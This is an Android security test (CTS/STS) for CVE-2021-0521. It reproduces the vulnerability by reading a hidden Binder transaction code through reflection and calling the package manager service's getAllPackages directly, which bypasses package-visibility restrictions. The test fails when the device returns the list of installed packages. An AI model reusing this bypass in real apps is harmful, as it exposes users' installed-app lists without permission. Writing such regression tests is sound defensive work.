/*
 * Copyright (C) 2021 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts;

import android.os.IBinder;
import android.os.Parcel;
import android.platform.test.annotations.AsbSecurityTest;
import android.platform.test.annotations.SecurityTest;
import android.util.Log;
import androidx.test.runner.AndroidJUnit4;
import com.android.sts.common.util.StsExtraBusinessLogicTestCase;
import java.lang.reflect.Field;
import java.util.Collections;
import java.util.List;
import org.junit.runner.RunWith;
import org.junit.Test;

import static org.hamcrest.core.Is.is;
import static org.hamcrest.core.IsNot.not;
import static org.junit.Assert.assertThat;
import static org.junit.Assume.assumeThat;

@RunWith(AndroidJUnit4.class)
public class CVE_2021_0521 extends StsExtraBusinessLogicTestCase {

    private String TAG = "CVE_2021_0521";

    private int getFunctionCode(String className) {
        int code = -1;
        try {
            Class c = Class.forName(className);
            Field field = c.getDeclaredField("TRANSACTION_getAllPackages");
            field.setAccessible(true);
            code = field.getInt(c);
        } catch (Exception e) {
            Log.e(TAG, "Exception caught " + e.toString());
        }
        return code;
    }

    private IBinder getIBinderFromServiceManager(String serviceName) {
        try {
            return (IBinder) Class.forName("android.os.ServiceManager")
                    .getMethod("getService", String.class).invoke(null, serviceName);
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * b/174661955
     */
    @AsbSecurityTest(cveBugId = 174661955)
    @SecurityTest(minPatchLevel = "2021-06")
    @Test
    public void testPocCVE_2021_0521() {
        IBinder pmsBinder = getIBinderFromServiceManager("package");
        List<String> allPkgList = Collections.<String>emptyList();
        try {
            String desciption = pmsBinder.getInterfaceDescriptor();
            int code = getFunctionCode(desciption + "$Stub");
            assumeThat(code, not(is(-1)));
            Parcel send = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            send.writeInterfaceToken(desciption);
            if (pmsBinder.transact(code, send, reply, 0)) {
                reply.readException();
                allPkgList = reply.createStringArrayList();
            }
        } catch (Exception e) {
            Log.e(TAG, "Exception caught " + e.toString());
        } finally {
            Log.e(TAG, "List of installed packages: " + allPkgList.toString());
            assertThat("Got a non empty list of installed packages, hence device "
                    + "is vulnerable to b/174661955", allPkgList.size(), is(0));
        }
    }
}
